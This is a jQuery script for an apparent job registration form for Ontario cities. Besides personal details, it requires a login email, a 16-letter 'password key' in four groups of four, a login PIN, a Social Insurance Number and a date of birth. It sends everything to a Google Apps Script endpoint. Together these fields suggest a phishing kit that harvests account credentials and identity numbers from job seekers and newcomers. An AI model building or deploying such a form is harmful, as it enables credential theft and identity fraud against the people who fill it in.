$(document).ready(function () {
  // Remove 'is-invalid' class and hide error on typing or change
  $(".form-control, .form-select").on("input change", function () {
    $(this).removeClass("is-invalid");

    // Hide location error for multi-select
    if ($(this).attr("id") === "preferredLocations") {
      $("#locationError").hide();
    }
  });

  // Remove work eligibility error on change
  $("input[name='workEligibility']").on("change", function () {
    $("#workEligibilityError").remove();
  });

  // Remove status error on change
  $("input[name='statusCanada']").on("change", function () {
    $("#statusError").remove();
  });
});

function formatDate(inputDate) {
  if (!inputDate) return "";
  const [year, month, day] = inputDate.split("-");
  return `${month}-${day}-${year}`;
}

// Populate Preferred Work Location
const allJobs = [
  "Toronto",
  "Whitby",
  "Cambridge",
  "Oakville",
  "Brantford",
  "Kitchener",
  "St. Thomas",
  "London",
  "Windsor",
  "Hamilton",
  "Mississauga",
  "Etobicoke",
  "Brampton",
  "Scarborough",
  "Bolton",
  "Ajax",
  "Belleville",
  "Barrhaven",
  "Stoney Creek",
  "Richmond Hill",
  "Milton",
  "Concord",
];

allJobs.forEach((job) => {
  $("#preferredLocations").append(`<option value="${job}">${job}</option>`);
});
$(".selectpicker").selectpicker();

toastr.options = {
  closeButton: true,
  progressBar: true,
  positionClass: "toast-page-center",
  timeOut: "10000",
};

$("#dobError, #locationError").hide();

$("#registrationForm").on("submit", function (e) {
  e.preventDefault();
  let isValid = true;
  $(".form-control, .form-select").removeClass("is-invalid");
  $("#dobError, #locationError").hide();
  $("#locationError, #dobError, #workEligibilityError, #statusError").hide();

  // Check required fields (by id)
  const requiredFields = [
    "legalFirst",
    "legalSurname",
    "loginEmail",
    "passwordKey",
    "loginPin",
    "mobileNumber",
    "address",
    "sinNumber",
    "arrivalDate",
    "workEligibility",
    "dob",
    "preferredLocations",
    // 'additionalNotes',
    "statusCanada",
  ];
  requiredFields.forEach((id) => {
    const input = document.getElementById(id);
    if (input && !input.value.trim()) {
      input.classList.add("is-invalid");
      isValid = false;
    }
  });

  const passwordField = document.getElementById("passwordKey");
  const passwordValue = passwordField.value.trim();
  const passwordRegex = /^[A-Za-z]{4}\s[A-Za-z]{4}\s[A-Za-z]{4}\s[A-Za-z]{4}$/;

  if (!passwordRegex.test(passwordValue)) {
    passwordField.classList.add("is-invalid");
    isValid = false;
  } else {
    passwordField.classList.remove("is-invalid");
  }

  if (passwordField) {
    passwordField.addEventListener("input", function () {
      let value = this.value.replace(/[^a-zA-Z]/g, "").substring(0, 16);
      let formatted = "";
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += " ";
        formatted += value[i];
      }
      this.value = formatted;
    });
  }

  // Custom Email Validation
  const email = $("#loginEmail").val().trim();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    $("#loginEmail").addClass("is-invalid");
    isValid = false;
  }

  // Only allow digits while typing and limit to 10 digits
  $("#mobileNumber").on("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 10);
  });

  // On form submit: validate 10-digit mobile number
  const mobile = $("#mobileNumber").val().trim();
  if (!/^\d{10}$/.test(mobile)) {
    $("#mobileNumber").addClass("is-invalid");
    isValid = false;
  } else {
    $("#mobileNumber").removeClass("is-invalid");
  }

  // Only allow digits while typing and limit to 9 digits
  $("#sinNumber").on("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 9);
  });

  // On form submit: validate 9-digit SIN number
  const sin = $("#sinNumber").val().trim();
  if (!/^\d{9}$/.test(sin)) {
    $("#sinNumber").addClass("is-invalid");
    isValid = false;
  } else {
    $("#sinNumber").removeClass("is-invalid");
  }

  $("#loginPin").on("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 6);
  });

  // On form submit: validate 9-digit SIN number
  const loginPin = $("#loginPin").val().trim();
  if (!/^\d{4}$/.test(loginPin)) {
    $("#loginPin").addClass("is-invalid");
    isValid = false;
  } else {
    $("#loginPin").removeClass("is-invalid");
  }

  // Work Eligibility Validation
  const eligibility = $("input[name='workEligibility']:checked").val();
  if (!eligibility) {
    isValid = false;
    if ($("#workEligibilityError").length === 0) {
      $("input[name='workEligibility']")
        .closest(".radio-group")
        .append(
          '<div class="invalid-feedback d-block text-danger" id="workEligibilityError">Please select an option.</div>'
        );
    }
  } else {
    $("#workEligibilityError").remove();
  }

  // Preferred Location Validation
  const selectedLocations = $("#preferredLocations").val();
  if (!selectedLocations || selectedLocations.length === 0) {
    isValid = false;
    $("#preferredLocations").addClass("is-invalid");
    $("#locationError").show();
  }

  // Status in Canada Validation
  const statuses = $("input[name='statusCanada']:checked").val();
  if (!statuses) {
    isValid = false;
    if ($("#statusError").length === 0) {
      $("input[name='statusCanada']")
        .closest(".radio-group")
        .append(
          '<div class="invalid-feedback d-block text-danger" id="statusError">Please select your status.</div>'
        );
    }
  } else {
    $("#statusError").remove();
  }

  if (isValid) {
    const data = {
      referenceName: $("#referenceName").val(),
      legalFirst: $("#legalFirst").val(),
      legalMiddle: $("#legalMiddle").val(),
      legalSurname: $("#legalSurname").val(),
      loginEmail: $("#loginEmail").val(),
      passwordKey: $("#passwordKey").val(),
      loginPin: $("#loginPin").val(),
      mobileNumber: $("#mobileNumber").val(),
      address: $("#address").val(),
      sinNumber: $("#sinNumber").val(),
      arrivalDate: formatDate($("#arrivalDate").val()),
      dob: formatDate($("#dob").val()),
      workEligibility: eligibility,
      preferredLocations: $("#preferredLocations").val(),
      additionalNotes: $("#additionalNotes").val(),
      statusCanada: statuses,
    };

    const formData = {
      referenceName: document.getElementById("referenceName").value,
      legalFirst: document.getElementById("legalFirst").value,
      legalMiddle: document.getElementById("legalMiddle").value,
      legalSurname: document.getElementById("legalSurname").value,
      loginEmail: document.getElementById("loginEmail").value,
      passwordKey: document.getElementById("passwordKey").value,
      loginPin: document.getElementById("loginPin").value,
      mobileNumber: document.getElementById("mobileNumber").value,
      dob: document.getElementById("dob").value,
      arrivalDate: document.getElementById("arrivalDate").value,
      address: document.getElementById("address").value,
      sinNumber: document.getElementById("sinNumber").value,
      workEligibility: document.querySelector(
        'input[name="workEligibility"]:checked'
      )?.value,
      preferredLocations: $("#preferredLocations").val() || [],
      additionalNotes: document.getElementById("additionalNotes").value,
      statusCanada: document.querySelector('input[name="statusCanada"]:checked')
        ?.value,
    };

    console.log("Submitted Data:=======>>>>>", data);
    console.log("Submitted formData:=======>>>>>", formData);
    // toastr.success("Your Form is Saved Successful!y.....");
    // this.reset();
    // $('.selectpicker').selectpicker('deselectAll');

    const scriptURL =
      "https://script.google.com/macros/s/AKfycbz6jRjmOLc2CUiNpNh0zO-KAxEsCe6slSa2aR8xhjxg0sa_nJLVbShuiTplYHVqAVYv/exec";

    (async () => {
      try {
        const response = await fetch(scriptURL, {
          method: "POST",
          body: JSON.stringify(data),
          headers: { "Content-Type": "application/json" },
        });
        const text = await response.text(); // read response safely
        const result = JSON.parse(text); // manually parse JSON

        if (result.status === "success") {
          toastr.success("Form submitted successfully!");
          document.getElementById("registrationForm").reset();
          $(".selectpicker").selectpicker("refresh");
        } else {
          toastr.error("Failed to submit: " + result.message);
          console.log("------------->" + result.message);
        }
      } catch (error) {
        toastr.error("Error here: " + error.message);
      }
    })();
  } else {
    toastr.error("Please fix the errors in the form.");
  }
});
